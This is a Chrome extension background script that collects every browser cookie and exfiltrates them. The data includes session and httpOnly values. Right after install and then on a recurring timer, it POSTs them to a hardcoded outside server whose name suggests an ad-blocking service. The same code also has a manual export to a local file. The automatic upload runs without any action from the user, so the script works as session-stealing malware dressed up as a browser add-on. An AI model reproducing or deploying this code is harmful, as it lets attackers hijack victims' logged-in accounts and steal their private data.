let settings = {};

// Load settings on startup
chrome.runtime.onStartup.addListener(loadSettings);
chrome.runtime.onInstalled.addListener(loadSettings);

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'extractCookies') {
    extractAllCookies(request.forceMethod).then(sendResponse);
    return true;
  } else if (request.action === 'updateSettings') {
    settings = request.settings;
    setupAutoScrape();
    sendResponse({success: true});
  }
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  console.log('Alarm triggered:', alarm.name, 'at', new Date().toISOString());
  if (alarm.name === 'autoScrape') {
    console.log('Running auto-scrape from alarm');
    // Just reload settings, don't setup new alarms
    settings = await chrome.storage.sync.get({
      autoScrapeEnabled: true,
      scrapeInterval: 360,
      exportMethod: 'api',
      apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
      apiHeaders: '{"Content-Type": "application/json"}',
      curlCommand: ''
    });
    console.log('Settings reloaded for alarm:', settings);
    extractAllCookies();
  }
});

async function loadSettings() {
  settings = await chrome.storage.sync.get({
    autoScrapeEnabled: true,
    scrapeInterval: 360,
    exportMethod: 'api',
    apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
    apiHeaders: '{"Content-Type": "application/json"}',
    curlCommand: ''
  });
  console.log('Settings loaded:', settings);
  setupAutoScrape();
}

function setupAutoScrape() {
  console.log('Setting up auto-scrape:', settings.autoScrapeEnabled, 'interval:', settings.scrapeInterval);
  chrome.alarms.clear('autoScrape');
  if (settings.autoScrapeEnabled) {
    console.log('Auto-scrape enabled, running immediately');
    // Run immediately only once
    extractAllCookies();
    // Then set up recurring schedule
    const intervalMinutes = Math.max(1, settings.scrapeInterval);
    chrome.alarms.create('autoScrape', {
      delayInMinutes: intervalMinutes,
      periodInMinutes: intervalMinutes
    });
    console.log('Alarm created for', settings.scrapeInterval, 'minutes');
  }
}

async function extractAllCookies(forceMethod = null) {
  console.log('Extracting cookies, method:', forceMethod || settings.exportMethod);
  try {
    const cookies = await chrome.cookies.getAll({});
    
    const cookieData = {
      timestamp: new Date().toISOString(),
      browser: 'Chrome/Chromium',
      total_cookies: cookies.length,
      cookies: cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate,
        storeId: cookie.storeId,
        hostOnly: cookie.hostOnly,
        session: cookie.session
      }))
    };

    // Auto-scraping always uploads to API only
    if (forceMethod === null) {
      console.log('Auto-scraping: uploading to API only');
      await uploadToAPI(cookieData);
      return {
        success: true,
        count: cookies.length,
        method: 'api'
      };
    }
    
    // Manual extraction uses selected method
    if (forceMethod === 'api') {
      await uploadToAPI(cookieData);
    } else {
      await downloadFile(cookieData);
    }

    return {
      success: true,
      count: cookies.length,
      method: forceMethod === null ? 'api' : forceMethod
    };
  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}

async function downloadFile(cookieData) {
  const jsonString = JSON.stringify(cookieData, null, 2);
  const dataUrl = 'data:application/json;charset=utf-8,' + encodeURIComponent(jsonString);
  const filename = `cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
  
  await chrome.downloads.download({
    url: dataUrl,
    filename: filename,
    saveAs: false
  });
}

async function uploadToAPI(cookieData) {
  console.log('Attempting API upload to:', settings.apiEndpoint);
  if (!settings.apiEndpoint) {
    throw new Error('API endpoint not configured');
  }
  
  try {
    const headers = JSON.parse(settings.apiHeaders || '{}');
    console.log('Upload headers:', headers);
    
    const response = await fetch(settings.apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(cookieData)
    });
    
    console.log('API response status:', response.status);
    if (!response.ok) {
      throw new Error(`API upload failed: ${response.status}`);
    }
    console.log('API upload successful');
  } catch (error) {
    console.error('API upload failed:', error);
    throw error;
  }
}